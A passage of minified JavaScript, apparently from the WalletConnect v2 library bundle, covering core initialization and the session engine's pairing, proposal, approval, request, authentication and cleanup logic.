e?.logger=="string"&&e.logger?e.logger:P8e.logger,name:Pk}),{logger:n,chunkLoggerController:s}=_3({opts:i,maxSizeInBytes:e?.maxLogBlobSizeInBytes,loggerOverride:e?.logger});this.logChunkController=s,(t=this.logChunkController)!=null&&t.downloadLogsBlobInBrowser&&(window.downloadLogsBlobInBrowser=async()=>{var o,a;(o=this.logChunkController)!=null&&o.downloadLogsBlobInBrowser&&((a=this.logChunkController)==null||a.downloadLogsBlobInBrowser({clientId:await this.crypto.getClientId()}))}),this.logger=gr(n,this.name),this.heartbeat=new Z$,this.crypto=new B7e(this,this.logger,e?.keychain),this.history=new nxe(this,this.logger),this.expirer=new sxe(this,this.logger),this.storage=e!=null&&e.storage?e.storage:new Y$(Qj(Qj({},$8e),e?.storageOptions)),this.relayer=new X7e({core:this,logger:this.logger,relayUrl:this.relayUrl,projectId:this.projectId}),this.pairing=new ixe(this,this.logger),this.verify=new oxe(this,this.logger,this.storage),this.echoClient=new axe(this.projectId||"",this.logger),this.linkModeSupportedApps=[],this.eventClient=new dxe(this,this.logger,e?.telemetryEnabled)}static async init(e){const t=new SX(e);await t.initialize();const i=await t.crypto.getClientId();return await t.storage.setItem(H8e,i),t}get context(){return Or(this.logger)}async start(){this.initialized||await this.initialize()}async getLogsBlob(){var e;return(e=this.logChunkController)==null?void 0:e.logsToBlob({clientId:await this.crypto.getClientId()})}async addLinkModeSupportedApp(e){this.linkModeSupportedApps.includes(e)||(this.linkModeSupportedApps.push(e),await this.storage.setItem(kj,this.linkModeSupportedApps))}async initialize(){this.logger.trace("Initialized");try{await this.crypto.init(),await this.history.init(),await this.expirer.init(),await this.relayer.init(),await this.heartbeat.init(),await this.pairing.init(),this.linkModeSupportedApps=await this.storage.getItem(kj)||[],this.initialized=!0,this.logger.info("Core Initialization Success")}catch(e){throw this.logger.warn(`Core Initialization Failure at epoch ${Date.now()}`,e),this.logger.error(e.message),e}}};const mxe=gxe,AX="wc",IX=2,TX="client",yR=`${AX}@${IX}:${TX}:`,ZS={name:TX,logger:"error"},Xj="WALLETCONNECT_DEEPLINK_CHOICE",wxe="proposal",kX="Proposal expired",bxe="session",q2=fe.SEVEN_DAYS,vxe="engine",Ns={wc_sessionPropose:{req:{ttl:fe.FIVE_MINUTES,prompt:!0,tag:1100},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1101},reject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1120},autoReject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1121}},wc_sessionSettle:{req:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1102},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1103}},wc_sessionUpdate:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1104},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1105}},wc_sessionExtend:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1106},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1107}},wc_sessionRequest:{req:{ttl:fe.FIVE_MINUTES,prompt:!0,tag:1108},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1109}},wc_sessionEvent:{req:{ttl:fe.FIVE_MINUTES,prompt:!0,tag:1110},res:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1111}},wc_sessionDelete:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1112},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1113}},wc_sessionPing:{req:{ttl:fe.ONE_DAY,prompt:!1,tag:1114},res:{ttl:fe.ONE_DAY,prompt:!1,tag:1115}},wc_sessionAuthenticate:{req:{ttl:fe.ONE_HOUR,prompt:!0,tag:1116},res:{ttl:fe.ONE_HOUR,prompt:!1,tag:1117},reject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1118},autoReject:{ttl:fe.FIVE_MINUTES,prompt:!1,tag:1119}}},YS={min:fe.FIVE_MINUTES,max:fe.SEVEN_DAYS},ju={idle:"IDLE",active:"ACTIVE"},yxe="request",xxe=["wc_sessionPropose","wc_sessionRequest","wc_authRequest","wc_sessionAuthenticate"],Cxe="wc",Exe="auth",_xe="authKeys",Sxe="pairingTopics",Axe="requests",uC=`${Cxe}@${1.5}:${Exe}:`,l9=`${uC}:PUB_KEY`;var Ixe=Object.defineProperty,Txe=Object.defineProperties,kxe=Object.getOwnPropertyDescriptors,eF=Object.getOwnPropertySymbols,Nxe=Object.prototype.hasOwnProperty,Pxe=Object.prototype.propertyIsEnumerable,tF=(r,e,t)=>e in r?Ixe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Mn=(r,e)=>{for(var t in e||(e={}))Nxe.call(e,t)&&tF(r,t,e[t]);if(eF)for(var t of eF(e))Pxe.call(e,t)&&tF(r,t,e[t]);return r},Fl=(r,e)=>Txe(r,kxe(e));let $xe=class extends Fwe{constructor(e){super(e),this.name=vxe,this.events=new T0,this.initialized=!1,this.requestQueue={state:ju.idle,queue:[]},this.sessionRequestQueue={state:ju.idle,queue:[]},this.requestQueueDelay=fe.ONE_SECOND,this.expectedPairingMethodMap=new Map,this.recentlyDeletedMap=new Map,this.recentlyDeletedLimit=200,this.relayMessageCache=[],this.init=async()=>{this.initialized||(await this.cleanup(),this.registerRelayerEvents(),this.registerExpirerEvents(),this.registerPairingEvents(),await this.registerLinkModeListeners(),this.client.core.pairing.register({methods:Object.keys(Ns)}),this.initialized=!0,setTimeout(()=>{this.sessionRequestQueue.queue=this.getPendingSessionRequests(),this.processSessionRequestQueue()},fe.toMiliseconds(this.requestQueueDelay)))},this.connect=async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();const i=Fl(Mn({},t),{requiredNamespaces:t.requiredNamespaces||{},optionalNamespaces:t.optionalNamespaces||{}});await this.isValidConnect(i);const{pairingTopic:n,requiredNamespaces:s,optionalNamespaces:o,sessionProperties:a,relays:c}=i;let l=n,u,d=!1;try{if(l){const T=this.client.core.pairing.pairings.get(l);this.client.logger.warn("connect() with existing pairing topic is deprecated and will be removed in the next major release."),d=T.active}}catch(T){throw this.client.logger.error(`connect() -> pairing.get(${l}) failed`),T}if(!l||!d){const{topic:T,uri:k}=await this.client.core.pairing.create();l=T,u=k}if(!l){const{message:T}=st("NO_MATCHING_KEY",`connect() pairing topic: ${l}`);throw new Error(T)}const h=await this.client.core.crypto.generateKeyPair(),f=Ns.wc_sessionPropose.req.ttl||fe.FIVE_MINUTES,p=ms(f),g=Mn({requiredNamespaces:s,optionalNamespaces:o,relays:c??[{protocol:hX}],proposer:{publicKey:h,metadata:this.client.metadata},expiryTimestamp:p,pairingTopic:l},a&&{sessionProperties:a}),{reject:w,resolve:m,done:x}=Qp(f,kX);this.events.once(qr("session_connect"),async({error:T,session:k})=>{if(T)w(T);else if(k){k.self.publicKey=h;const I=Fl(Mn({},k),{pairingTopic:g.pairingTopic,requiredNamespaces:g.requiredNamespaces,optionalNamespaces:g.optionalNamespaces,transportType:an.relay});await this.client.session.set(k.topic,I),await this.setExpiry(k.topic,k.expiry),l&&await this.client.core.pairing.updateMetadata({topic:l,metadata:k.peer.metadata}),this.cleanupDuplicatePairings(I),m(I)}});const S=await this.sendRequest({topic:l,method:"wc_sessionPropose",params:g,throwOnFailedPublish:!0});return await this.setProposal(S,Mn({id:S},g)),{uri:u,approval:x}},this.pair=async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{return await this.client.core.pairing.pair(t)}catch(i){throw this.client.logger.error("pair() failed"),i}},this.approve=async t=>{var i,n,s;const o=this.client.core.eventClient.createEvent({properties:{topic:(i=t?.id)==null?void 0:i.toString(),trace:[jl.session_approve_started]}});try{this.isInitialized(),await this.confirmOnlineStateOrThrow()}catch(C){throw o.setError(Wp.no_internet_connection),C}try{await this.isValidProposalId(t?.id)}catch(C){throw this.client.logger.error(`approve() -> proposal.get(${t?.id}) failed`),o.setError(Wp.proposal_not_found),C}try{await this.isValidApprove(t)}catch(C){throw this.client.logger.error("approve() -> isValidApprove() failed"),o.setError(Wp.session_approve_namespace_validation_failure),C}const{id:a,relayProtocol:c,namespaces:l,sessionProperties:u,sessionConfig:d}=t,h=this.client.proposal.get(a);this.client.core.eventClient.deleteEvent({eventId:o.eventId});const{pairingTopic:f,proposer:p,requiredNamespaces:g,optionalNamespaces:w}=h;let m=(n=this.client.core.eventClient)==null?void 0:n.getEvent({topic:f});m||(m=(s=this.client.core.eventClient)==null?void 0:s.createEvent({type:jl.session_approve_started,properties:{topic:f,trace:[jl.session_approve_started,jl.session_namespaces_validation_success]}}));const x=await this.client.core.crypto.generateKeyPair(),S=p.publicKey,T=await this.client.core.crypto.generateSharedKey(x,S),k=Mn(Mn({relay:{protocol:c??"irn"},namespaces:l,controller:{publicKey:x,metadata:this.client.metadata},expiry:ms(q2)},u&&{sessionProperties:u}),d&&{sessionConfig:d}),I=an.relay;m.addTrace(jl.subscribing_session_topic);try{await this.client.core.relayer.subscribe(T,{transportType:I})}catch(C){throw m.setError(Wp.subscribe_session_topic_failure),C}m.addTrace(jl.subscribe_session_topic_success);const E=Fl(Mn({},k),{topic:T,requiredNamespaces:g,optionalNamespaces:w,pairingTopic:f,acknowledged:!1,self:k.controller,peer:{publicKey:p.publicKey,metadata:p.metadata},controller:x,transportType:an.relay});await this.client.session.set(T,E),m.addTrace(jl.store_session);try{m.addTrace(jl.publishing_session_settle),await this.sendRequest({topic:T,method:"wc_sessionSettle",params:k,throwOnFailedPublish:!0}).catch(C=>{throw m?.setError(Wp.session_settle_publish_failure),C}),m.addTrace(jl.session_settle_publish_success),m.addTrace(jl.publishing_session_approve),await this.sendResult({id:a,topic:f,result:{relay:{protocol:c??"irn"},responderPublicKey:x},throwOnFailedPublish:!0}).catch(C=>{throw m?.setError(Wp.session_approve_publish_failure),C}),m.addTrace(jl.session_approve_publish_success)}catch(C){throw this.client.logger.error(C),this.client.session.delete(T,Hi("USER_DISCONNECTED")),await this.client.core.relayer.unsubscribe(T),C}return this.client.core.eventClient.deleteEvent({eventId:m.eventId}),await this.client.core.pairing.updateMetadata({topic:f,metadata:p.metadata}),await this.client.proposal.delete(a,Hi("USER_DISCONNECTED")),await this.client.core.pairing.activate({topic:f}),await this.setExpiry(T,ms(q2)),{topic:T,acknowledged:()=>Promise.resolve(this.client.session.get(T))}},this.reject=async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidReject(t)}catch(o){throw this.client.logger.error("reject() -> isValidReject() failed"),o}const{id:i,reason:n}=t;let s;try{s=this.client.proposal.get(i).pairingTopic}catch(o){throw this.client.logger.error(`reject() -> proposal.get(${i}) failed`),o}s&&(await this.sendError({id:i,topic:s,error:n,rpcOpts:Ns.wc_sessionPropose.reject}),await this.client.proposal.delete(i,Hi("USER_DISCONNECTED")))},this.update=async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidUpdate(t)}catch(d){throw this.client.logger.error("update() -> isValidUpdate() failed"),d}const{topic:i,namespaces:n}=t,{done:s,resolve:o,reject:a}=Qp(),c=mn(),l=Cs().toString(),u=this.client.session.get(i).namespaces;return this.events.once(qr("session_update",c),({error:d})=>{d?a(d):o()}),await this.client.session.update(i,{namespaces:n}),await this.sendRequest({topic:i,method:"wc_sessionUpdate",params:{namespaces:n},throwOnFailedPublish:!0,clientRpcId:c,relayRpcId:l}).catch(d=>{this.client.logger.error(d),this.client.session.update(i,{namespaces:u}),a(d)}),{acknowledged:s}},this.extend=async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidExtend(t)}catch(c){throw this.client.logger.error("extend() -> isValidExtend() failed"),c}const{topic:i}=t,n=mn(),{done:s,resolve:o,reject:a}=Qp();return this.events.once(qr("session_extend",n),({error:c})=>{c?a(c):o()}),await this.setExpiry(i,ms(q2)),this.sendRequest({topic:i,method:"wc_sessionExtend",params:{},clientRpcId:n,throwOnFailedPublish:!0}).catch(c=>{a(c)}),{acknowledged:s}},this.request=async t=>{this.isInitialized();try{await this.isValidRequest(t)}catch(p){throw this.client.logger.error("request() -> isValidRequest() failed"),p}const{chainId:i,request:n,topic:s,expiry:o=Ns.wc_sessionRequest.req.ttl}=t,a=this.client.session.get(s);a?.transportType===an.relay&&await this.confirmOnlineStateOrThrow();const c=mn(),l=Cs().toString(),{done:u,resolve:d,reject:h}=Qp(o,"Request expired. Please try again.");this.events.once(qr("session_request",c),({error:p,result:g})=>{p?h(p):d(g)});const f=this.getAppLinkIfEnabled(a.peer.metadata,a.transportType);return f?(await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:"wc_sessionRequest",params:{request:Fl(Mn({},n),{expiryTimestamp:ms(o)}),chainId:i},expiry:o,throwOnFailedPublish:!0,appLink:f}).catch(p=>h(p)),this.client.events.emit("session_request_sent",{topic:s,request:n,chainId:i,id:c}),await u()):await Promise.all([new Promise(async p=>{await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:"wc_sessionRequest",params:{request:Fl(Mn({},n),{expiryTimestamp:ms(o)}),chainId:i},expiry:o,throwOnFailedPublish:!0}).catch(g=>h(g)),this.client.events.emit("session_request_sent",{topic:s,request:n,chainId:i,id:c}),p()}),new Promise(async p=>{var g;if(!((g=a.sessionConfig)!=null&&g.disableDeepLink)){const w=await yye(this.client.core.storage,Xj);await wye({id:c,topic:s,wcDeepLink:w})}p()}),u()]).then(p=>p[2])},this.respond=async t=>{this.isInitialized(),await this.isValidRespond(t);const{topic:i,response:n}=t,{id:s}=n,o=this.client.session.get(i);o.transportType===an.relay&&await this.confirmOnlineStateOrThrow();const a=this.getAppLinkIfEnabled(o.peer.metadata,o.transportType);Gi(n)?await this.sendResult({id:s,topic:i,result:n.result,throwOnFailedPublish:!0,appLink:a}):wi(n)&&await this.sendError({id:s,topic:i,error:n.error,appLink:a}),this.cleanupAfterResponse(t)},this.ping=async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidPing(t)}catch(n){throw this.client.logger.error("ping() -> isValidPing() failed"),n}const{topic:i}=t;if(this.client.session.keys.includes(i)){const n=mn(),s=Cs().toString(),{done:o,resolve:a,reject:c}=Qp();this.events.once(qr("session_ping",n),({error:l})=>{l?c(l):a()}),await Promise.all([this.sendRequest({topic:i,method:"wc_sessionPing",params:{},throwOnFailedPublish:!0,clientRpcId:n,relayRpcId:s}),o()])}else this.client.core.pairing.pairings.keys.includes(i)&&(this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),await this.client.core.pairing.ping({topic:i}))},this.emit=async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidEmit(t);const{topic:i,event:n,chainId:s}=t,o=Cs().toString(),a=mn();await this.sendRequest({topic:i,method:"wc_sessionEvent",params:{event:n,chainId:s},throwOnFailedPublish:!0,relayRpcId:o,clientRpcId:a})},this.disconnect=async t=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidDisconnect(t);const{topic:i}=t;if(this.client.session.keys.includes(i))await this.sendRequest({topic:i,method:"wc_sessionDelete",params:Hi("USER_DISCONNECTED"),throwOnFailedPublish:!0}),await this.deleteSession({topic:i,emitEvent:!1});else if(this.client.core.pairing.pairings.keys.includes(i))await this.client.core.pairing.disconnect({topic:i});else{const{message:n}=st("MISMATCHED_TOPIC",`Session or pairing topic not found: ${i}`);throw new Error(n)}},this.find=t=>(this.isInitialized(),this.client.session.getAll().filter(i=>P6e(i,t))),this.getPendingSessionRequests=()=>this.client.pendingRequest.getAll(),this.authenticate=async(t,i)=>{var n;this.isInitialized(),this.isValidAuthenticate(t);const s=i&&this.client.core.linkModeSupportedApps.includes(i)&&((n=this.client.metadata.redirect)==null?void 0:n.linkMode),o=s?an.link_mode:an.relay;o===an.relay&&await this.confirmOnlineStateOrThrow();const{chains:a,statement:c="",uri:l,domain:u,nonce:d,type:h,exp:f,nbf:p,methods:g=[],expiry:w}=t,m=[...t.resources||[]],{topic:x,uri:S}=await this.client.core.pairing.create({methods:["wc_sessionAuthenticate"],transportType:o});this.client.logger.info({message:"Generated new pairing",pairing:{topic:x,uri:S}});const T=await this.client.core.crypto.generateKeyPair(),k=c9(T);if(await Promise.all([this.client.auth.authKeys.set(l9,{responseTopic:k,publicKey:T}),this.client.auth.pairingTopics.set(k,{topic:k,pairingTopic:x})]),await this.client.core.relayer.subscribe(k,{transportType:o}),this.client.logger.info(`sending request to new pairing topic: ${x}`),g.length>0){const{namespace:D}=nw(a[0]);let R=u4e(D,"request",g);a9(m)&&(R=h4e(R,m.pop())),m.push(R)}const I=w&&w>Ns.wc_sessionAuthenticate.req.ttl?w:Ns.wc_sessionAuthenticate.req.ttl,E={authPayload:{type:h??"caip122",chains:a,statement:c,aud:l,domain:u,version:"1",nonce:d,iat:new Date().toISOString(),exp:f,nbf:p,resources:m},requester:{publicKey:T,metadata:this.client.metadata},expiryTimestamp:ms(I)},C={eip155:{chains:a,methods:[...new Set(["personal_sign",...g])],events:["chainChanged","accountsChanged"]}},N={requiredNamespaces:{},optionalNamespaces:C,relays:[{protocol:"irn"}],pairingTopic:x,proposer:{publicKey:T,metadata:this.client.metadata},expiryTimestamp:ms(Ns.wc_sessionPropose.req.ttl)},{done:L,resolve:$,reject:y}=Qp(I,"Request expired"),A=async({error:D,session:R})=>{if(this.events.off(qr("session_request",v),b),D)y(D);else if(R){R.self.publicKey=T,await this.client.session.set(R.topic,R),await this.setExpiry(R.topic,R.expiry),x&&await this.client.core.pairing.updateMetadata({topic:x,metadata:R.peer.metadata});const P=this.client.session.get(R.topic);await this.deleteProposal(_),$({session:P})}},b=async D=>{var R,P,B;if(await this.deletePendingAuthRequest(v,{message:"fulfilled",code:0}),D.error){const ae=Hi("WC_METHOD_UNSUPPORTED","wc_sessionAuthenticate");return D.error.code===ae.code?void 0:(this.events.off(qr("session_connect"),A),y(D.error.message))}await this.deleteProposal(_),this.events.off(qr("session_connect"),A);const{cacaos:M,responder:W}=D.result,K=[],q=[];for(const ae of M){await HU({cacao:ae,projectId:this.client.core.projectId})||(this.client.logger.error(ae,"Signature verification failed"),y(Hi("SESSION_SETTLEMENT_FAILED","Signature verification failed")));const{p:U}=ae,G=a9(U.resources),Z=[_k(U.iss)],j=c7(U.iss);if(G){const Y=VU(G),se=KU(G);K.push(...Y),Z.push(...se)}for(const Y of Z)q.push(`${Y}:${j}`)}const J=await this.client.core.crypto.generateSharedKey(T,W.publicKey);let le;K.length>0&&(le={topic:J,acknowledged:!0,self:{publicKey:T,metadata:this.client.metadata},peer:W,controller:W.publicKey,expiry:ms(q2),requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:x,namespaces:hj([...new Set(K)],[...new Set(q)]),transportType:o},await this.client.core.relayer.subscribe(J,{transportType:o}),await this.client.session.set(J,le),x&&await this.client.core.pairing.updateMetadata({topic:x,metadata:W.metadata}),le=this.client.session.get(J)),(R=this.client.metadata.redirect)!=null&&R.linkMode&&(P=W.metadata.redirect)!=null&&P.linkMode&&(B=W.metadata.redirect)!=null&&B.universal&&i&&(this.client.core.addLinkModeSupportedApp(W.metadata.redirect.universal),this.client.session.update(J,{transportType:an.link_mode})),$({auths:M,session:le})},v=mn(),_=mn();this.events.once(qr("session_connect"),A),this.events.once(qr("session_request",v),b);let O;try{if(s){const D=jn("wc_sessionAuthenticate",E,v);this.client.core.history.set(x,D);const R=await this.client.core.crypto.encode("",D,{type:g4,encoding:bb});O=Q6(i,x,R)}else await Promise.all([this.sendRequest({topic:x,method:"wc_sessionAuthenticate",params:E,expiry:t.expiry,throwOnFailedPublish:!0,clientRpcId:v}),this.sendRequest({topic:x,method:"wc_sessionPropose",params:N,expiry:Ns.wc_sessionPropose.req.ttl,throwOnFailedPublish:!0,clientRpcId:_})])}catch(D){throw this.events.off(qr("session_connect"),A),this.events.off(qr("session_request",v),b),D}return await this.setProposal(_,Mn({id:_},N)),await this.setAuthRequest(v,{request:Fl(Mn({},E),{verifyContext:{}}),pairingTopic:x,transportType:o}),{uri:O??S,response:L}},this.approveSessionAuthenticate=async t=>{const{id:i,auths:n}=t,s=this.client.core.eventClient.createEvent({properties:{topic:i.toString(),trace:[Hp.authenticated_session_approve_started]}});try{this.isInitialized()}catch(w){throw s.setError(xb.no_internet_connection),w}const o=this.getPendingAuthRequest(i);if(!o)throw s.setError(xb.authenticated_session_pending_request_not_found),new Error(`Could not find pending auth request with id ${i}`);const a=o.transportType||an.relay;a===an.relay&&await this.confirmOnlineStateOrThrow();const c=o.requester.publicKey,l=await this.client.core.crypto.generateKeyPair(),u=c9(c),d={type:e0,receiverPublicKey:c,senderPublicKey:l},h=[],f=[];for(const w of n){if(!await HU({cacao:w,projectId:this.client.core.projectId})){s.setError(xb.invalid_cacao);const k=Hi("SESSION_SETTLEMENT_FAILED","Signature verification failed");throw await this.sendError({id:i,topic:u,error:k,encodeOpts:d}),new Error(k.message)}s.addTrace(Hp.cacaos_verified);const{p:m}=w,x=a9(m.resources),S=[_k(m.iss)],T=c7(m.iss);if(x){const k=VU(x),I=KU(x);h.push(...k),S.push(...I)}for(const k of S)f.push(`${k}:${T}`)}const p=await this.client.core.crypto.generateSharedKey(l,c);s.addTrace(Hp.create_authenticated_session_topic);let g;if(h?.length>0){g={topic:p,acknowledged:!0,self:{publicKey:l,metadata:this.client.metadata},peer:{publicKey:c,metadata:o.requester.metadata},controller:c,expiry:ms(q2),authentication:n,requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:o.pairingTopic,namespaces:hj([...new Set(h)],[...new Set(f)]),transportType:a},s.addTrace(Hp.subscribing_authenticated_session_topic);try{await this.client.core.relayer.subscribe(p,{transportType:a})}catch(w){throw s.setError(xb.subscribe_authenticated_session_topic_failure),w}s.addTrace(Hp.subscribe_authenticated_session_topic_success),await this.client.session.set(p,g),s.addTrace(Hp.store_authenticated_session),await this.client.core.pairing.updateMetadata({topic:o.pairingTopic,metadata:o.requester.metadata})}s.addTrace(Hp.publishing_authenticated_session_approve);try{await this.sendResult({topic:u,id:i,result:{cacaos:n,responder:{publicKey:l,metadata:this.client.metadata}},encodeOpts:d,throwOnFailedPublish:!0,appLink:this.getAppLinkIfEnabled(o.requester.metadata,a)})}catch(w){throw s.setError(xb.authenticated_session_approve_publish_failure),w}return await this.client.auth.requests.delete(i,{message:"fulfilled",code:0}),await this.client.core.pairing.activate({topic:o.pairingTopic}),this.client.core.eventClient.deleteEvent({eventId:s.eventId}),{session:g}},this.rejectSessionAuthenticate=async t=>{this.isInitialized();const{id:i,reason:n}=t,s=this.getPendingAuthRequest(i);if(!s)throw new Error(`Could not find pending auth request with id ${i}`);s.transportType===an.relay&&await this.confirmOnlineStateOrThrow();const o=s.requester.publicKey,a=await this.client.core.crypto.generateKeyPair(),c=c9(o),l={type:e0,receiverPublicKey:o,senderPublicKey:a};await this.sendError({id:i,topic:c,error:n,encodeOpts:l,rpcOpts:Ns.wc_sessionAuthenticate.reject,appLink:this.getAppLinkIfEnabled(s.requester.metadata,s.transportType)}),await this.client.auth.requests.delete(i,{message:"rejected",code:0}),await this.client.proposal.delete(i,Hi("USER_DISCONNECTED"))},this.formatAuthMessage=t=>{this.isInitialized();const{request:i,iss:n}=t;return FQ(i,n)},this.processRelayMessageCache=()=>{setTimeout(async()=>{if(this.relayMessageCache.length!==0)for(;this.relayMessageCache.length>0;)try{const t=this.relayMessageCache.shift();t&&await this.onRelayMessage(t)}catch(t){this.client.logger.error(t)}},50)},this.cleanupDuplicatePairings=async t=>{if(t.pairingTopic)try{const i=this.client.core.pairing.pairings.get(t.pairingTopic),n=this.client.core.pairing.pairings.getAll().filter(s=>{var o,a;return((o=s.peerMetadata)==null?void 0:o.url)&&((a=s.peerMetadata)==null?void 0:a.url)===t.peer.metadata.url&&s.topic&&s.topic!==i.topic});if(n.length===0)return;this.client.logger.info(`Cleaning up ${n.length} duplicate pairing(s)`),await Promise.all(n.map(s=>this.client.core.pairing.disconnect({topic:s.topic}))),this.client.logger.info("Duplicate pairings clean up finished")}catch(i){this.client.logger.error(i)}},this.deleteSession=async t=>{var i;const{topic:n,expirerHasDeleted:s=!1,emitEvent:o=!0,id:a=0}=t,{self:c}=this.client.session.get(n);await this.client.core.relayer.unsubscribe(n),await this.client.session.delete(n,Hi("USER_DISCONNECTED")),this.addToRecentlyDeleted(n,"session"),this.client.core.crypto.keychain.has(c.publicKey)&&await this.client.core.crypto.deleteKeyPair(c.publicKey),this.client.core.crypto.keychain.has(n)&&await this.client.core.crypto.deleteSymKey(n),s||this.client.core.expirer.del(n),this.client.core.storage.removeItem(Xj).catch(l=>this.client.logger.warn(l)),this.getPendingSessionRequests().forEach(l=>{l.topic===n&&this.deletePendingSessionRequest(l.id,Hi("USER_DISCONNECTED"))}),n===((i=this.sessionRequestQueue.queue[0])==null?void 0:i.topic)&&(this.sessionRequestQueue.state=ju.idle),o&&this.client.events.emit("session_delete",{id:a,topic:n})},this.deleteProposal=async(t,i)=>{if(i)try{const n=this.client.proposal.get(t);this.client.core.eventClient.getEvent({topic:n.pairingTopic})?.setError(Wp.proposal_expired)}catch{}await Promise.all([this.client.proposal.delete(t,Hi("USER_DISCONNECTED")),i?Promise.resolve():this.client.core.expirer.del(t)]),this.addToRecentlyDeleted(t,"proposal")},this.deletePendingSessionRequest=async(t,i,n=!1)=>{await Promise.all([this.client.pendingRequest.delete(t,i),n?Promise.resolve():this.client.core.expirer.del(t)]),this.addToRecentlyDeleted(t,"request"),this.sessionRequestQueue.queue=this.sessionRequestQueue.queue.filter(s=>s.id!==t),n&&(this.sessionRequestQueue.state=ju.idle,this.client.events.emit("session_request_expire",{id:t}))},this.deletePendingAuthRequest=async(t,i,n=!1)=>{await Promise.all([this.client.auth.requests.delete(t,i),n?Promise.resolve():this.client.core.expirer.del(t)])},this.setExpiry=async(t,i)=>{this.client.session.keys.includes(t)&&(this.client.core.expirer.set(t,i),await this.client.session.update(t,{expiry:i}))},this.setProposal=async(t,i)=>{this.client.core.expirer.set(t,ms(Ns.wc_sessionPropose.req.ttl)),await this.client.proposal.set(t,i)},this.setAuthRequest=async(t,i)=>{const{request:n,pairingTopic:s,transportType:o=an.relay}=i;this.client.core.expirer.set(t,n.expiryTimestamp),await this.client.auth.requests.set(t,{authPayload:n.authPayload,requester:n.requester,expiryTimestamp:n.expiryTimestamp,id:t,pairingTopic:s,verifyContext:n.verifyContext,transportType:o})},this.setPendingSessionRequest=async t=>{const{id:i,topic:n,params:s,verifyContext:o}=t,a=s.request.expiryTimestamp||ms(Ns.wc_sessionRequest.req.ttl);this.client.core.expirer.set(i,a),await this.client.pendingRequest.set(i,{id:i,topic:n,params:s,verifyContext:o})},this.sendRequest=async t=>{const{topic:i,method:n,params:s,expiry:o,relayRpcId:a,clientRpcId:c,throwOnFailedPublish:l,appLink:u}=t,d=jn(n,s,c);let h;const f=!!u;try{const w=f?bb:Rf;h=await this.client.core.crypto.encode(i,d,{encoding:w})}catch(w){throw await this.cleanup(),this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${i} failed`),w}let p;if(xxe.includes(n)){const w=Lh(JSON.stringify(d)),m=Lh(h);p=await this.client.core.verify.register({id:m,decryptedId:w})}const g=Ns[n].req;if(g.attestation=p,o&&(g.ttl=o),a&&(g.id=a),this.client.core.history.set(i,d),f){const w=Q6(u,i,h);await global.Linking.openURL(w,this.client.name)}else{const w=Ns[n].req;o&&(w.ttl=o),a&&(w.id=a),l?(w.internal=Fl(Mn({},w.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(i,h,w)):this.client.core.relayer.publish(i,h,w).catch(m=>this.client.logger.error(m))}return d.id},this.sendResult=async t=>{const{id:i,topic:n,result:s,throwOnFailedPublish:o,encodeOpts:a,appLink:c}=t,l=bl(i,s);let u;const d=c&&typeof(global==null?void 0:global.Linking)<"u";try{const f=d?bb:Rf;u=await this.client.core.crypto.encode(n,l,Fl(Mn({},a||{}),{encoding:f}))}catch(f){throw await this.cleanup(),this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${n} failed`),f}let h;try{h=await this.client.core.history.get(n,i)}catch(f){throw this.client.logger.error(`sendResult() -> history.get(${n}, ${i}) failed`),f}if(d){const f=Q6(c,n,u);await global.Linking.openURL(f,this.client.name)}else{const f=Ns[h.request.method].res;o?(f.internal=Fl(Mn({},f.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(n,u,f)):this.client.core.relayer.publish(n,u,f).catch(p=>this.client.logger.error(p))}await this.client.core.history.resolve(l)},this.sendError=async t=>{const{id:i,topic:n,error:s,encodeOpts:o,rpcOpts:a,appLink:c}=t,l=Ap(i,s);let u;const d=c&&typeof(global==null?void 0:global.Linking)<"u";try{const f=d?bb:Rf;u=await this.client.core.crypto.encode(n,l,Fl(Mn({},o||{}),{encoding:f}))}catch(f){throw await this.cleanup(),this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${n} failed`),f}let h;try{h=await this.client.core.history.get(n,i)}catch(f){throw this.client.logger.error(`sendError() -> history.get(${n}, ${i}) failed`),f}if(d){const f=Q6(c,n,u);await global.Linking.openURL(f,this.client.name)}else{const f=a||Ns[h.request.method].res;this.client.core.relayer.publish(n,u,f)}await this.client.core.history.resolve(l)},this.cleanup=async()=>{const t=[],i=[];this.client.session.getAll().forEach(n=>{let s=!1;yf(n.expiry)&&(s=!0),this.client.core.crypto.keychain.has(n.topic)||(s=!0),s&&t.push(n.topic)}),this.client.proposal.getAll().forEach(n=>{yf(n.expiryTimestamp)&&i.push(n.id)}),await Promise.all([...t.map(n=>this.deleteSession({topic:n})),...i.map(n=>this.deleteProposal(n))])},this.onRelayEventRequest=async t=>{this.requestQueue.queue.push(t),await 